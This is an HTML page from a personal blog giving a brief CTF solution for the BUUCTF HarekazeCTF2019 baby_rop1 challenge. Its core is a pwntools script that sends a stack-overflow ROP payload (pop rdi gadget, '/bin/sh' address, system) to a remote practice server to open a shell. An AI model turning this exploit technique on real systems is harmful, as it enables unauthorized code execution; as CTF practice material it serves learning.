@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AkyOI | By a JS OIer</title>
+    <link rel="stylesheet" href="https://zcoi.github.io/CSS/reset.css">
+    <link rel="stylesheet" href="https://zcoi.github.io/CSS/head.css">
+    <!-- <link rel="stylesheet" href="https://zcoi.github.io/CSS/blog.css"> -->
+    <link rel="stylesheet" href="https://zcoi.github.io/CSS/blog.css">
+    <link rel="shortcut icon" href="https://zcoi.github.io/HTMLSource/icon.jpg">
+
+    <link rel="stylesheet" href="https://zcoi.github.io/highlight/styles/atom-one-dark-reasonable.min.css">  <!--引入默认代码样式，可换其他的-->
+    <!-- <link rel="stylesheet" href="https://zcoi.github.io/highlight/styles/dark.min.css">     引入代码深色背景   -->
+    <script src="https://zcoi.github.io/highlight/highlight.min.js"></script>    <!--引入代码高亮js-->
+    <script src="https://zcoi.github.io/linenumber/dist/highlightjs-line-numbers.min.js"></script><!--引入添加行号js-->
+
+    <script>
+        hljs.initHighlightingOnLoad(); // 初始化
+        hljs.initLineNumbersOnLoad();
+    </script>
+        
+    <style>
+        .back{
+            z-index: -999;
+            background-color: rgba(255,255,255,0.7);
+            position: fixed;
+            width: 100%;
+            height: 100%;
+        }
+
+        *{
+            background-repeat: no-repeat;
+        }
+        html,main{
+            height: auto;
+            width: 100%;
+            /* background-color:rgba(255,255,255,0.7); */
+        }
+
+/* ------------------------------------------------------------------- */
+        .maintext{
+             /* background-color: rgba(255, 255, 255, 0.9); */
+            width: 80%;
+            border: rgba(100, 149, 237,0.8) 2px solid;
+            border-radius: 10px;
+            height: auto;
+            position: relative;
+            left: 10%;
+            top: 50px;
+        }
+        .maintxt{
+             /* background-color: rgba(255, 255, 255, 0.9); */
+            width: 90%;
+            border: rgba(100, 149, 237,0.8) 2px solid;
+            border-radius: 10px;
+            height: auto;
+            position: relative;
+            left: 5%;
+            top: 0px;
+            line-height: 25px;
+            font-size: 20px;
+            font-family: 'Consolas','等线', Courier, monospace;
+        }
+        .maintext a{font-family: 'Courier New','楷体', Courier, monospace;font-size: 20px;}
+        .texts{
+            line-height: 25px;
+            font-size: 20px;
+            font-family: 'Consolas','等线', Courier, monospace;
+            width: 90%;
+            border: rgba(100, 149, 237,0.8) 2px solid;
+            border-radius: 10px;
+            height: auto;
+            position: relative;
+            left: 5%;
+        }
+        .head01{
+            line-height: 40px;
+            font-size: 40px;
+            font-family: 'Consolas','楷体', Courier, monospace;
+            font: bold;
+            color: darkorchid;
+        }
+        .head02{
+            font-family: 'Courier New','楷体', Courier, monospace;
+            font:bold;
+            font-size: 40px;
+            line-height: 90px;
+            color: cornflowerblue;
+        }
+
+/* ------------------------------------------------------------------- */
+        .ttop{
+            font-family: 'Courier New', Courier, monospace;
+            font: bold;
+            text-align: center;
+            line-height: 80px;
+            font-size: 30px;
+            height: 80px;
+            width: 80px;
+            border: 2px solid black;
+            border-radius: 50px;
+            position:fixed;
+            right: 40px;
+            bottom: 60px;
+            float: right;
+            
+            color: blueviolet;
+        }
+        a{
+            text-decoration: none;
+            
+        }
+    </style>
+</head>
+
+<body>
+        <div class="sidebar">
+        <!-- 关闭侧边栏按钮 -->
+        <button class="close-btn">&times;</button>
+        <!-- 导航链接 -->
+        <nav class="nav">
+        <ul>
+            <br><br><br><br>
+            <li><a href="https://zcoi.github.io/index.html">&#x2746 ~<div class="aky">Aky</div><div class="oi">OI</div>~</a></li>
+            <li><a href="https://zcoi.github.io/ProblemList/">&#x270e ProblemList</a></li>
+            <!-- <li><a href="./Softwares/">Softwares</a></li> -->
+            <li><a href="https://zcoi.github.io/blogs/">&#x27b4 Blogs</a></li>
+            <li><a href="https://zcoi.github.io/About/">&#x2656 About</a></li>
+            </ul>
+        </nav>
+    </div>
+    <!-- 遮罩层 -->
+    <div class="overlay"></div>
+    <!-- 引入 JavaScript 文件实现交互效果 -->
+    <header>
+        <div>
+            <ul class="head1">
+                <!-- <li> -->
+                    <button class="open-btn">&#9776;</button>
+                    <!-- <a href="./index.html">~AkyOI~</a> -->
+                
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <a href="https://zcoi.github.io/index.html"> &#x2746</a>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <a href="https://zcoi.github.io/ProblemList/"> &#x270e</a>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <a href="https://zcoi.github.io/blogs/"> &#x27b4</a>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <a href="https://zcoi.github.io/About/"> &#x2656</a>
+            </ul>
+        </div>
+        <!-- <div>
+            <ul class="head1">
+                <li>
+                    <a href="./ProblemList/">ProblemList</a>
+                </li>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <li>
+                    <a href="./Softwares/">Softwares</a>
+                    <ul class="part1">
+                        <li><a href="./Softwares/Online/">OnlineJudge</a></li>
+                        <li><a href="./Softwares/Offline/">OfflineJudge</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <li>
+                    <a href="./Downloads/">Downloads</a>
+                    <ul class="part1">
+                        <li><a href="./Downloads/Problems/">Problems</a></li>
+                        <li><a href="./Downloads/Books/">EBooks</a></li>
+                        <li><a href="./Downloads/Learning/">Learning</a></li>
+                    </ul>
+                </li>
+            </ul>
+        </div>
+        <div>
+            <ul class="head1">
+                <li>
+                    <a href="./About/">About</a>
+                </li>
+            </ul>
+        </div> -->
+
+    </header>
+    <div class="back"></div>
+    <main>
+        <div class="maintext">
+            <br>
+            <div class="head01">BUUCTF-[HarekazeCTF2019]baby_rop1</div>
+            <br>
+            <div class="head02">EXP</div>
+            <br>
+
+            <div class="maintxt">checksec后可以用栈溢出做
+            
+            <pre><code>from pwn import *
+    # id=process('./babyrop')
+    id=remote('node4.buuoj.cn',28284)
+    shadd=0x601048
+    # 0x18
+    payload='a'*0x18+p64(0x400683).decode("iso-8859-1")+p64(shadd).decode("iso-8859-1")+p64(0x400490).decode("iso-8859-1")
+    id.sendline(payload)
+    id.interactive()
+    # 64位ELF调用函数system构造payload ： fill + address‘pop rdi ; ret’ + command_address + system_address）
+    # 此题flag藏得深，可以用find / -name 'flag'
+            </code></pre><br><br><br>
+            </div><br><br><br><br><br><br>
+            
+        </div>
+        
+        <br><br><br><br><br><br>
+        <br><br><br><br><br><br>
+        <br><br><br><br><br><br>
+        <br><br><br><br><br><br><br><br><br><br><br><br>
+        
+    </main>
+    <div class="footer">
+            AkyOI ~ 2023 | By Zchared 
+    </div>
+    <script src="https://zcoi.github.io/JavaScripts/mainscripts.js"></script>
+</body>
+</html>
